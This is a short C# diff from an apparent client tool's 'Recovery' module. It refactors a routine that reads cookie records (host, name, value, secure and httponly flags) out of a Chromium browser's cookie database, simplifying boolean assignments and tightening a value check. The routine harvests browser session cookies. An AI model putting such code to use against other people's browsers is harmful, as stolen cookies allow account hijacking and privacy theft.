@@ -107,14 +107,14 @@ namespace xClient.Core.Recovery.Helper
                     expires = SQLDatabase.GetValue(i, "expires_utc");
                     lastaccess = SQLDatabase.GetValue(i, "last_access_utc");
 
-                    secure = SQLDatabase.GetValue(i, "secure") == "1" ? true : false;
-                    http = SQLDatabase.GetValue(i, "httponly") == "1" ? true : false;
-                    expired = SQLDatabase.GetValue(i, "has_expired") == "1" ? true : false;
-                    persistent = SQLDatabase.GetValue(i, "persistent") == "1" ? true : false;
-                    priority = SQLDatabase.GetValue(i, "priority") == "1" ? true : false;
+                    secure = SQLDatabase.GetValue(i, "secure") == "1";
+                    http = SQLDatabase.GetValue(i, "httponly") == "1";
+                    expired = SQLDatabase.GetValue(i, "has_expired") == "1";
+                    persistent = SQLDatabase.GetValue(i, "persistent") == "1";
+                    priority = SQLDatabase.GetValue(i, "priority") == "1";
 
 
-                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && value != null)
+                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
                     {
                         data.Add(new ChromiumCookie
                         {
